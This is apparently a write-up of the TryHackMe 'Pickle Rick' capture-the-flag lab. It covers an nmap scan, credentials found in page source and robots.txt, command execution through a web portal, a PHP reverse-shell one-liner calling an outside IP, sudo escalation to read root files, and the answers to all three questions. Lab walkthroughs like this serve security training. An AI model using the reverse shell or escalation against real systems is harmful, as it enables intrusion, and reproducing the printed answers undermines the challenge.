
Link - "https://tryhackme.com/room/picklerick"

> A Rick and Morty CTF. Help turn Rick back into a human!

# Pickle Rick

This Rick and Morty-themed challenge requires you to exploit a web server and find three ingredients to help Rick make his potion and transform himself back into a human from a pickle.

Let's go with nmap scan first  - 

```shell

$ sudo nmap -sCV 10.10.52.188

Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-03 01:32 BST
Nmap scan report for 10.10.52.188
Host is up (0.069s latency).
Not shown: 998 closed tcp ports (reset)

PORT   STATE SERVICE VERSION

22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 b3:08:a2:9a:d0:c4:39:cb:e1:be:b3:ec:10:38:97:83 (RSA)
|   256 cc:69:63:09:de:40:d4:62:f3:4d:a0:74:63:dd:bb:98 (ECDSA)
|_  256 42:0c:a3:f0:15:e3:55:03:30:0b:21:6d:b9:62:8d:3a (ED25519)

80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Rick is sup4r cool
|_http-server-header: Apache/2.4.41 (Ubuntu)

Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.05 seconds

```

"view-source:http://10.10.52.188/"
```
Listen Morty... I need your help, I've turned myself into a pickle again and this time I can't change back!

I need you to *BURRRP*...Morty, logon to my computer and find the last three secret ingredients to finish my pickle-reverse potion. The only problem is,
I have no idea what the *BURRRRRRRRP*, password was! Help Morty, Help!

    Note to self, remember username!
    Username: R1ckRul3s
```

"http://10.10.52.188/robots.txt" - Wubbalubbadubdub. Well no idea what this text means.... 

We can get the login page here - "http://10.10.52.188/login.php" and finally we can get the access using the username - "R1ckRul3s" and password - "Wubbalubbadubdub". 

"http://10.10.52.188/portal.php" - seems like interesting. We can execute commands here.

ls
```
Sup3rS3cretPickl3Ingred.txt
assets
clue.txt
denied.php
index.html
login.php
portal.php
robots.txt
```

We can't read these files from "portal.php" using cat. But we got something in the source - 
```
Vm1wR1UxTnRWa2RUV0d4VFlrZFNjRlV3V2t0alJsWnlWbXQwVkUxV1duaFZNakExVkcxS1NHVkliRmhoTVhCb1ZsWmFWMVpWTVVWaGVqQT0==
```

We tried to decode it and got the output - "rabbit hole".

Well, we can get a reverse shell using this php code - 
```php
php -r '$sock=fsockopen("10.8.135.159",4242);exec("/bin/sh -i <&3 >&3 2>&3");'
```

```shell

$ cat Sup3rS3cretPickl3Ingred.txt
mr. meeseek hair

$ cat clue.txt
Look around the file system for the other ingredient.

```

**Q1. What is the first ingredient that Rick needs?**
	mr. meeseek hair

```shell

$ cd /home
$ ls
rick
ubuntu
$ cd rick
$ ls
second ingredients
$ cat "second ingredients"
1 jerry tear
$ pwd
/home/rick
```

**Q2. What is the second ingredient in Rick’s potion?**
	1 jerry tear

```shell

$ sudo -l
Matching Defaults entries for www-data on ip-10-10-165-33:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on ip-10-10-165-33:
    (ALL) NOPASSWD: ALL

$ sudo ls /root
3rd.txt
snap

$ sudo cat /root/3rd.txt
3rd ingredients: fleeb juice

```

**Q3. What is the last and final ingredient?**
	fleeb juice


! Happy Hacking !